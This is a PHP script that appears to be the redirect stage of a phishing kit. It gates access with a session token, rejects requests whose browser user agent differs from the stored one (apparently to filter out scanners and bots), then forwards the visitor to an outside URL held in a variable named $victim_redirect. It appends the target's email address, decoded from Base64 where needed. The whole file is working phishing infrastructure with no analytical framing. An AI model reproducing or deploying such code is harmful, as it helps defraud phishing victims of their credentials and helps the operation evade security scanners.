<?php
session_start();

// Validate that the POST token exists and matches the stored session token.
if (!isset($_POST['e84c04c00c8e6f1117a0c7c603adab81']) || $_POST['e84c04c00c8e6f1117a0c7c603adab81'] !== ($_SESSION['id'] ?? '')) {
    http_response_code(404);
    exit('Not Found');
}

// Verify that the browser making the request is the same as the one that started the session.
$currentUserAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$storedUserAgent  = $_SESSION['user_agent'] ?? '';
if ($storedUserAgent !== $currentUserAgent) {
    http_response_code(403);
    exit('Browser mismatch – untrusted access');
}

// Define the base redirect URL.
$victim_redirect = "https://mac.sa.com/6?ai=xd";

// If an email parameter is provided in the URL, attempt to decode and validate it.
if (isset($_GET['email'])) {
    $email = $_GET['email'];

    // Try to decode assuming the email might be Base64 encoded.
    $decoded_email = base64_decode($email, true);
    if ($decoded_email !== false && filter_var($decoded_email, FILTER_VALIDATE_EMAIL)) {
        $email = $decoded_email;
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        // If neither decoded nor plain value is a valid email, ignore it.
        $email = '';
    }

    // Append the email to the redirect URL if valid.
    if (!empty($email)) {
        $separator = (strpos($victim_redirect, '?') !== false) ? '&' : '?';
        $victim_redirect .= $separator . 'email=' . urlencode($email);
    }
}

// Clean up the session.
session_destroy();
session_start();
$_SESSION['bot'] = false;

// Finally, perform the redirect.
header("Location: " . $victim_redirect);
exit();
?>
